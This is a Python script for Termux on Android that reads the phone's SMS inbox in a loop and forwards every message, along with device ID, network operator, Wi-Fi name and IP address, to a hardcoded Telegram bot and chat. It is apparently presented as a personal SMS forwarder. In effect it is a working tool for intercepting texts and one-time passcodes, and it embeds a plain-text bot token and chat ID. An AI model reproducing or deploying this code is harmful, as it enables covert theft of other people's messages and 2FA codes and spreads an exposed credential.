#!/usr/bin/env python3
import json
import os
import time
import requests
import subprocess
import logging
from datetime import datetime

# Telegram configuration
TELEGRAM_BOT_TOKEN = "7854831812:AAF5JDgaf43BsMgysPZOIBPzW_39p44gGxw"
TELEGRAM_CHAT_ID = "8111628064"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='sms_bot.log'
)

def setup_termux_api():
    """Check and install Termux:API if needed"""
    try:
        # Check if termux-sms-list is available
        subprocess.run(["termux-sms-list", "-h"], 
                      stdout=subprocess.PIPE, 
                      stderr=subprocess.PIPE, 
                      check=True)
        logging.info("Termux:API is already installed")
    except (subprocess.SubprocessError, FileNotFoundError):
        logging.warning("Termux:API not found, attempting to install...")
        try:
            subprocess.run(["pkg", "update", "-y"], check=True)
            subprocess.run(["pkg", "install", "termux-api", "-y"], check=True)
            logging.info("Termux:API installed successfully")
        except subprocess.SubprocessError as e:
            logging.error(f"Failed to install Termux:API: {e}")
            raise

def get_device_info():
    """Gather device information using Termux API"""
    device_info = {}
    
    try:
        # Get battery info
        result = subprocess.run(["termux-battery-status"], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True)
        if result.returncode == 0:
            battery = json.loads(result.stdout)
            device_info["battery"] = f"{battery.get('percentage', 'Unknown')}% - {battery.get('status', 'Unknown')}"
        
        # Get device info
        result = subprocess.run(["termux-telephony-deviceinfo"], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True)
        if result.returncode == 0:
            device = json.loads(result.stdout)
            device_info["device_id"] = device.get("device_id", "Unknown")
            device_info["phone_type"] = device.get("phone_type", "Unknown")
            device_info["network_operator"] = device.get("network_operator", "Unknown")
            
        # Get WiFi info
        result = subprocess.run(["termux-wifi-connectioninfo"], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True)
        if result.returncode == 0:
            wifi = json.loads(result.stdout)
            device_info["wifi"] = wifi.get("ssid", "Not connected")
            device_info["ip"] = wifi.get("ip", "Unknown")
            
    except (subprocess.SubprocessError, json.JSONDecodeError) as e:
        logging.error(f"Error gathering device info: {e}")
        
    return device_info

def send_startup_message():
    """Send initial message when script starts"""
    device_info = get_device_info()
    
    message = "<b>🚀 SMS Forwarder Started</b>\n\n"
    message += "<b>Device Information:</b>\n"
    
    if device_info:
        for key, value in device_info.items():
            message += f"<b>{key.replace('_', ' ').title()}:</b> {value}\n"
    else:
        message += "Could not retrieve device information\n"
        
    message += f"\n<b>Start Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    send_telegram_message(message)
    logging.info("Sent startup message to Telegram")

def get_sms_messages():
    """Retrieve SMS messages using Termux:API"""
    try:
        # Force shorter timeout to make it more responsive
        result = subprocess.run(["termux-sms-list", "-l", "100"], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True, 
                               timeout=10)
        
        if result.returncode != 0:
            logging.error(f"Error retrieving SMS: {result.stderr}")
            return []
            
        try:
            return json.loads(result.stdout)
        except json.JSONDecodeError as e:
            logging.error(f"Error parsing SMS JSON: {e}")
            # Log the actual stdout for debugging
            logging.error(f"Raw output: {result.stdout}")
            return []
            
    except subprocess.TimeoutExpired:
        logging.error("Timeout while retrieving SMS")
        return []
    except Exception as e:
        logging.error(f"Unexpected error retrieving SMS: {e}")
        return []

def send_telegram_message(message):
    """Send message to Telegram"""
    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    
    try:
        response = requests.post(api_url, data=data, timeout=10)
        if response.status_code != 200:
            logging.error(f"Telegram API error: {response.status_code} - {response.text}")
            return False
        return True
    except requests.RequestException as e:
        logging.error(f"Error sending to Telegram: {e}")
        return False
    except Exception as e:
        logging.error(f"Unexpected error sending to Telegram: {e}")
        return False

def format_sms(sms):
    """Format SMS message for Telegram"""
    try:
        timestamp = datetime.fromtimestamp(int(sms.get('received', '0'))/1000).strftime('%Y-%m-%d %H:%M:%S')
    except (ValueError, TypeError):
        timestamp = "Unknown time"
        
    return (
        f"<b>📱 New SMS</b>\n"
        f"<b>From:</b> {sms.get('number', 'Unknown')}\n"
        f"<b>Time:</b> {timestamp}\n"
        f"<b>Message:</b> {sms.get('body', 'No content')}"
    )

def save_processed_sms(sms_ids):
    """Save IDs of processed SMS to avoid duplicate sending"""
    try:
        with open("processed_sms.txt", "w") as f:
            for sms_id in sms_ids:
                f.write(f"{sms_id}\n")
    except Exception as e:
        logging.error(f"Error saving processed SMS IDs: {e}")

def load_processed_sms():
    """Load IDs of processed SMS"""
    if not os.path.exists("processed_sms.txt"):
        return set()
    
    try:
        with open("processed_sms.txt", "r") as f:
            return set(line.strip() for line in f)
    except Exception as e:
        logging.error(f"Error loading processed SMS IDs: {e}")
        return set()

def main():
    """Main function to monitor and forward SMS"""
    logging.info("Starting SMS forwarder to Telegram")
    print("SMS to Telegram forwarder started. Press Ctrl+C to stop.")
    
    # Setup Termux:API
    setup_termux_api()
    
    # Send startup message with device info
    send_startup_message()
    
    # Keep track of processed messages
    processed_sms = load_processed_sms()
    
    try:
        while True:
            # Get all SMS messages
            sms_messages = get_sms_messages()
            
            if not sms_messages:
                time.sleep(10)  # Shorter wait time
                continue
            
            # Check for new messages and send them
            new_messages_count = 0
            for sms in sms_messages:
                sms_id = str(sms.get('_id', ''))
                # If no ID is available, create one from the content and time
                if not sms_id:
                    number = sms.get('number', '')
                    body = sms.get('body', '')
                    received = sms.get('received', '')
                    sms_id = f"{number}-{received}-{hash(body)}"
                
                if sms_id and sms_id not in processed_sms:
                    formatted_message = format_sms(sms)
                    if send_telegram_message(formatted_message):
                        processed_sms.add(sms_id)
                        new_messages_count += 1
                        logging.info(f"Forwarded SMS from {sms.get('number', 'Unknown')}")
            
            # Save processed messages
            if new_messages_count > 0:
                save_processed_sms(processed_sms)
                print(f"Forwarded {new_messages_count} new messages to Telegram")
            
            # Wait before checking again
            time.sleep(15)  # Check more frequently
            
    except KeyboardInterrupt:
        print("\nStopping SMS forwarder")
        logging.info("SMS forwarder stopped by user")
        send_telegram_message("⚠️ <b>SMS Forwarder stopped</b>")
    except Exception as e:
        error_msg = f"Unexpected error: {e}"
        print(error_msg)
        logging.error(error_msg)
        send_telegram_message(f"⚠️ <b>Error in SMS forwarder:</b> {e}")
        
        # Try to restart after error
        time.sleep(30)
        main()  # Attempt to restart

if __name__ == "__main__":
    main()
